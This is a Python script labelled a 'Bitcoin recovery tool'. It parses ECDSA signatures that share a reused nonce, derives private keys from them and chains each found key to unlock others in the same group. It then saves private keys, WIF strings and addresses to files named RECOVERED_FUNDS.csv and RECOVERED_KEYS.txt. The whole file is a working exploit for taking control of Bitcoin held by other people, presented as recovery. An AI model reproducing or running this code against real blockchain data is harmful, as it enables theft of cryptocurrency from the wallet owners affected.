# ==============================================================================
# STANDALONE BITCOIN RECOVERY TOOL (Fix for Python 3.12+ / OpenSSL 3.0)
# ==============================================================================

import os
import sys
import re
import csv
import hashlib
import time

# Check for ECDSA
try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

# ==============================================================================
# CONFIG & CONSTANTS
# ==============================================================================

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
OUTPUT_CSV = "RECOVERED_FUNDS.csv"
OUTPUT_WIF = "RECOVERED_KEYS.txt"
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"  # Bech32 charset

# ==============================================================================
# COMPATIBILITY FIX (RIPEMD160)
# ==============================================================================

def calc_ripemd160(data: bytes) -> bytes:
    """
    Robust RIPEMD160 calculator. Falls back to pycryptodome if hashlib fails.
    """
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] System OpenSSL has disabled RIPEMD160.")
            print("Please run: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# CRYPTO & ADDRESS HELPERS
# ==============================================================================

def bech32_polymod(values):
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): return None
    return ret

def base58_encode(b):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
        x, rem = divmod(x, 58)
        out.append(alphabet[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex, compressed=True):
    priv = bytes.fromhex("80" + priv_hex)
    if compressed: priv += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
    return base58_encode(priv + chk)

def pub_to_addresses(pub_hex):
    pub_bytes = bytes.fromhex(pub_hex)
    sha = hashlib.sha256(pub_bytes).digest()
    ripe = calc_ripemd160(sha)  # FIXED
    
    # P2PKH
    p2pkh = base58_encode(b"\x00" + ripe + hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4])
    
    # P2WPKH
    witness_prog = convertbits(ripe, 8, 5)
    p2wpkh = bech32_encode("bc", [0] + witness_prog)
    
    # P2SH-P2WPKH
    redeem = b"\x00\x14" + ripe
    sha_r = hashlib.sha256(redeem).digest()
    ripe_r = calc_ripemd160(sha_r) # FIXED
    p2sh = base58_encode(b"\x05" + ripe_r + hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4])
    
    return p2pkh, p2wpkh, p2sh

def verify_key(pub_hex, priv_int):
    if priv_int <= 0 or priv_int >= N: return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            x_bytes = pt.x().to_bytes(32, 'big')
            y_bytes = pt.y().to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            x_bytes = pt.x().to_bytes(32, 'big')
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
            
        return generated_pub == pub_hex.lower()
    except:
        return False

# ==============================================================================
# MATH / ATTACK LOGIC
# ==============================================================================

def modinv(a, m=N):
    return pow(a, -1, m)

def attempt_bootstrap(r, s1, z1, s2, z2):
    candidates = []
    s1_opts = [s1, N - s1]
    s2_opts = [s2, N - s2]
    
    for _s1 in s1_opts:
        for _s2 in s2_opts:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except: pass
    return candidates

def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
    candidates = []
    s_known_opts = [s_known, N - s_known]
    s_target_opts = [s_target, N - s_target]
    
    for _sk in s_known_opts:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in s_target_opts:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except: pass
    return candidates

# ==============================================================================
# MAIN LOGIC
# ==============================================================================

def get_file_path():
    while True:
        f = input("\n[?] Enter path to vulnerable data file (e.g. reports/rnon.txt): ").strip()
        # Remove quotes if user dragged and dropped file
        f = f.replace('"', '').replace("'", "")
        if os.path.isfile(f):
            return f
        print(f"[!] File not found: {f}")

def main():
    print("="*60)
    print("      BITCOIN RECOVERY TOOL (Standalone)")
    print("="*60)
    
    input_file = get_file_path()
    
    print("\n[-] Reading and parsing file...")
    try:
        with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read()
    except Exception as e:
        print(f"Error reading file: {e}")
        return

    # Parse groups
    parsed_groups = []
    # Splitting by separator lines
    raw_blocks = re.split(r"={10,}", raw_data)

    for block in raw_blocks:
        r_match = re.search(r"r:\s*([a-f0-9]{1,64})", block, re.IGNORECASE)
        if not r_match: continue
        r_hex = r_match.group(1).lower()
        
        # Regex to find s, z, pubkey
        txs = re.findall(r"s=([a-f0-9]+)[\s\S]*?z=([a-f0-9]+)[\s\S]*?pubkey=([a-f0-9]+)", block, re.IGNORECASE)
        
        valid_txs = []
        for s, z, pub in txs:
            if z != "N/A": 
                valid_txs.append((s, z, pub))

        if len(valid_txs) >= 2:
            parsed_groups.append({"r": int(r_hex, 16), "txs": valid_txs})

    print(f"[-] Loaded {len(parsed_groups)} groups for analysis.")
    if len(parsed_groups) == 0:
        print("[!] No valid reused nonce groups found in file.")
        return

    recovered_db = {}
    found_something = True
    iteration = 0

    print("\n[+] STARTING RECOVERY ENGINE...")

    while found_something:
        iteration += 1
        found_something = False
        print(f"--- Iteration {iteration} (Keys Found: {len(recovered_db)}) ---")
        
        for group in parsed_groups:
            r = group['r']
            txs = group['txs']
            
            pub_map = {}
            # Group by pubkey
            for s, z, pub in txs:
                pub = pub.lower()
                if pub not in pub_map: pub_map[pub] = []
                pub_map[pub].append((int(s, 16), int(z, 16)))
                
            # 1. BOOTSTRAP: Find key from same-key reuse
            for pub, entries in pub_map.items():
                if pub in recovered_db: continue
                if len(entries) >= 2:
                    s1, z1 = entries[0]
                    s2, z2 = entries[1]
                    candidates = attempt_bootstrap(r, s1, z1, s2, z2)
                    for d in candidates:
                        if verify_key(pub, d):
                            recovered_db[pub] = d
                            print(f"   [BOOTSTRAP] Key found: {pub[:16]}...")
                            found_something = True
                            break
            
            # 2. CHAINING: Use known key to find others in same r-group
            master_params = None
            for s, z, pub in txs:
                pub = pub.lower()
                if pub in recovered_db:
                    master_params = (int(s, 16), int(z, 16), recovered_db[pub])
                    break
            
            if master_params:
                s_known, z_known, d_known = master_params
                for s_target_hex, z_target_hex, pub_target in txs:
                    pub_target = pub_target.lower()
                    if pub_target in recovered_db: continue
                    s_t = int(s_target_hex, 16)
                    z_t = int(z_target_hex, 16)
                    candidates = attempt_chain(r, s_known, z_known, d_known, s_t, z_t)
                    for d in candidates:
                        if verify_key(pub_target, d):
                            recovered_db[pub_target] = d
                            print(f"   [CHAINED]   Unlocked: {pub_target[:16]}...")
                            found_something = True
                            break

    print(f"\n[+] RECOVERY FINISHED. Total Private Keys: {len(recovered_db)}")

    if len(recovered_db) > 0:
        print(f"[-] Saving to {OUTPUT_CSV}...")
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                
                if pub.startswith('04') and len(pub) == 130:
                    is_compressed = False
                    key_type = "Uncompressed"
                else:
                    is_compressed = True
                    key_type = "Compressed"
                
                wif = priv_to_wif(priv_hex, compressed=is_compressed)
                a1, a2, a3 = pub_to_addresses(pub)
                w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3])
                wif_list.append(wif)
                
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_list))
        print("Done.")
    else:
        print("No keys recovered.")

if __name__ == "__main__":
    main()